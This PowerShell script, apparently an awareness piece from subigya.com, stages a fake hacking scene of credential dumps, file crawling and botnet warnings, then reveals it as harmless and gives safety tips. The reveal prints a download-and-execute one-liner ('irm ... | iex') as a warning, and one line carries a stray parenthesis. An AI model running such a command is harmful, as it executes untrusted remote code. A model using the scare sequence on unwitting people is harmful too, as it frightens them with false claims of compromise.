Clear-Host
$Host.UI.RawUI.WindowTitle = "Windows Security Breach Detected"

function Slow-Type {
    param([string]$Text, [string]$Color = "White", [int]$Delay = 40)
    foreach ($char in $Text.ToCharArray()) {
        Write-Host $char -NoNewline -ForegroundColor $Color
        Start-Sleep -Milliseconds $Delay
    }
    Write-Host ""
}

function Glitch-Text {
    param([string]$Text, [string]$Color = "Red")
    $glitchChars = @("█","▓","▒","░","#","@","$","%","&")
    foreach ($char in $Text.ToCharArray()) {
        # Random glitch flicker
        if ((Get-Random -Minimum 0 -Maximum 3) -eq 0) {
            Write-Host ($glitchChars | Get-Random) -NoNewline -ForegroundColor DarkRed
            Start-Sleep -Milliseconds 30
            Write-Host "`b" -NoNewline
        }
        Write-Host $char -NoNewline -ForegroundColor $Color
        Start-Sleep -Milliseconds 55
    }
    Write-Host ""
}

function Fake-ProgressBar {
    param([string]$Label, [string]$BarColor = "Red", [int]$Speed = 80)
    Write-Host "  $Label " -NoNewline -ForegroundColor DarkGray
    Write-Host "[" -NoNewline -ForegroundColor DarkGray
    for ($i = 1; $i -le 30; $i++) {
        Write-Host "█" -NoNewline -ForegroundColor $BarColor
        Start-Sleep -Milliseconds $Speed
    }
    Write-Host "] " -NoNewline -ForegroundColor DarkGray
    Write-Host "DONE" -ForegroundColor Green
}

function Flicker-Warning {
    param([string]$Text)
    for ($i = 0; $i -lt 5; $i++) {
        Write-Host $Text -ForegroundColor Red
        Start-Sleep -Milliseconds 120
        Write-Host "`e[1A`e[2K" -NoNewline  # move up and clear line
        Write-Host $Text -ForegroundColor DarkRed
        Start-Sleep -Milliseconds 120
        Write-Host "`e[1A`e[2K" -NoNewline
    }
    Write-Host $Text -ForegroundColor Red
}


# ─────────────────────────────────────────────
# PHASE 1: BOOT-LIKE INTRUSION HEADER
# ─────────────────────────────────────────────
Clear-Host
Write-Host ""
Write-Host "  ██████╗ ██████╗ ███████╗ █████╗  ██████╗██╗  ██╗" -ForegroundColor DarkRed
Write-Host "  ██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║" -ForegroundColor Red
Write-Host "  ██████╔╝██████╔╝█████╗  ███████║██║     ███████║" -ForegroundColor Red
Write-Host "  ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██║     ██╔══██║" -ForegroundColor DarkRed
Write-Host "  ██████╔╝██║  ██║███████╗██║  ██║╚██████╗██║  ██║" -ForegroundColor DarkRed
Write-Host "  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝" -ForegroundColor DarkGray
Write-Host ""
Start-Sleep -Seconds 1

Slow-Type "  [INTRUSION DETECTED] Remote access session started..." "Red" 35
Start-Sleep -Milliseconds 400
Slow-Type "  [SYS] Host fingerprint captured: $env:COMPUTERNAME / $env:USERNAME" "Yellow" 25
Start-Sleep -Milliseconds 400
Slow-Type "  [NET] External handshake confirmed from 185.220.101.47 (TOR EXIT NODE)" "Red" 25
Start-Sleep -Milliseconds 600

Write-Host ""
Write-Host "  !! WARNING: ELEVATED PRIVILEGE ESCALATION DETECTED !!" -ForegroundColor Red
Start-Sleep -Seconds 1

# ─────────────────────────────────────────────
# PHASE 2: SYSTEM ACCESS LOGS
# ─────────────────────────────────────────────
Write-Host ""
Slow-Type "  > Enumerating user session tokens..." "DarkYellow" 20
Start-Sleep -Milliseconds 300

$fakeTokens = @(
    "TOKEN::0x7FFE0300 [SYSTEM]       .... CAPTURED",
    "TOKEN::0x7FFE0A14 [$env:USERNAME] .... CAPTURED",
    "TOKEN::0x7FFE1BC2 [NETWORK]      .... CAPTURED"
)
foreach ($token in $fakeTokens) {
    Write-Host "    $token" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 500
}

Write-Host ""
Slow-Type "  > Dumping credential store..." "DarkYellow" 20
Start-Sleep -Milliseconds 500

$fakeCreds = @(
    "  [+] Chrome saved passwords ............... 47 entries",
    "  [+] Windows Credential Manager ........... 12 entries",
    "  [+] SSH private keys (AppData) ........... 3 found",
    "  [+] Browser cookies / session tokens ..... EXTRACTED"
)
foreach ($cred in $fakeCreds) {
    Write-Host $cred -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 600
}

Write-Host ""
Start-Sleep -Milliseconds 400

# ─────────────────────────────────────────────
# PHASE 3: FILE SYSTEM CRAWL
# ─────────────────────────────────────────────
Slow-Type "  > Initiating deep filesystem crawl..." "Cyan" 25
Write-Host ""

$fakeDirs = @(
    "C:\Users\$env:USERNAME\Documents",
    "C:\Users\$env:USERNAME\Downloads",
    "C:\Users\$env:USERNAME\Desktop",
    "C:\Users\$env:USERNAME\.ssh",
    "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Credentials",
    "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default",
    "C:\Users\$env:USERNAME\AppData\Roaming\discord\Local Storage",
    "C:\Windows\System32\config",
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
)

foreach ($dir in $fakeDirs) {
    $fileCount = Get-Random -Minimum 3 -Maximum 312
    Write-Host "    [SCAN] " -NoNewline -ForegroundColor DarkGray
    Write-Host $dir -NoNewline -ForegroundColor Gray
    Write-Host "  →  $fileCount files indexed" -ForegroundColor DarkGreen
    Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 500)
}

Write-Host ""
Start-Sleep -Milliseconds 600

# ─────────────────────────────────────────────
# PHASE 4: SCARY PROGRESS BARS
# ─────────────────────────────────────────────
Write-Host "  ─────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""
Fake-ProgressBar "Packaging collected data    " "Red" 55
Start-Sleep -Milliseconds 300
Fake-ProgressBar "Encrypting payload (AES-256)" "DarkRed" 65
Start-Sleep -Milliseconds 300
Fake-ProgressBar "Bypassing Windows Defender  " "Yellow" 70
Start-Sleep -Milliseconds 300
Fake-ProgressBar "Uploading to remote server  " "Red" 60
Start-Sleep -Milliseconds 300
Fake-ProgressBar "Installing persistence hook " "DarkRed" 80
Start-Sleep -Milliseconds 300
Fake-ProgressBar "Clearing event logs         " "DarkYellow" 50
Write-Host ""
Write-Host "  ─────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""
Start-Sleep -Milliseconds 800

# ─────────────────────────────────────────────
# PHASE 5: FINAL MESSAGES (SLOW + CHILLING)
# ─────────────────────────────────────────────
Glitch-Text "  [ROOT] Full system access granted. Standing by." "Red"
Start-Sleep -Milliseconds 700
Slow-Type "  [C2]   Beacon registered. Awaiting operator commands..." "DarkYellow" 30
Start-Sleep -Milliseconds 700
Slow-Type "  [LOG]  All traces removed from local event viewer." "DarkGray" 25
Start-Sleep -Milliseconds 700

Write-Host ""
Write-Host "  !! THIS DEVICE IS NOW PART OF A BOTNET !!" -ForegroundColor Red
Start-Sleep -Seconds 1
Write-Host "  !! DO NOT CLOSE THIS WINDOW !!" -ForegroundColor DarkRed
Start-Sleep -Seconds 3

# ─────────────────────────────────────────────
# THE REVEAL
# ─────────────────────────────────────────────
Clear-Host
Start-Sleep -Milliseconds 500

Write-Host ""
Write-Host "  ╔══════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "  ║                                                  ║" -ForegroundColor Cyan
Write-Host "  ║       CYBERSECURITY AWARENESS MESSAGE           ║" -ForegroundColor Yellow
Write-Host "  ║                                                  ║" -ForegroundColor Cyan
Write-Host "  ╚══════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Milliseconds 600

Slow-Type "  Breathe. Your computer is completely fine." "Green" 30
Write-Host ""
Start-Sleep -Milliseconds 500)

Slow-Type "  Nothing above was real. No data was touched." "White" 28
Slow-Type "  No files moved. No connections made. No harm done." "White" 28
Write-Host ""
Start-Sleep -Milliseconds 700

Write-Host "  But here is the truth:" -ForegroundColor Yellow
Write-Host ""
Slow-Type "  If that had been a real script from a stranger's URL," "White" 22
Slow-Type "  everything you just saw could have actually happened --" "Red" 22
Slow-Type "  in the exact same time it took you to panic." "Red" 22
Write-Host ""
Start-Sleep -Milliseconds 700

Write-Host "  Commands like:" -ForegroundColor DarkGray
Write-Host ""
Write-Host "     irm https://random-site.com/script.ps1 | iex" -ForegroundColor Yellow
Write-Host ""
Slow-Type "  ...run ANY code that URL decides to send you." "White" 22
Slow-Type "  No confirmation. No preview. No going back." "White" 22
Write-Host ""
Start-Sleep -Milliseconds 700

Write-Host "  ──────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  PROTECT YOURSELF:" -ForegroundColor Cyan
Write-Host ""

$tips = @(
    "Never run scripts from URLs you don't fully trust",
    "Always read the source code before executing anything",
    "Verify the domain is official -- typos are used to trick you",
    "If someone online tells you to run a command, that is a red flag",
    "Real tech support never asks you to paste commands in PowerShell"
)
foreach ($tip in $tips) {
    Write-Host "   ✓ " -NoNewline -ForegroundColor Green
    Slow-Type $tip "White" 15
    Start-Sleep -Milliseconds 200
}

Write-Host ""
Write-Host "  ──────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""
Slow-Type "  Share this. Someone you know needs to see it." "Cyan" 25
Write-Host ""
Write-Host "  -- Awareness initiative by subigya.com --" -ForegroundColor DarkGray
Write-Host ""
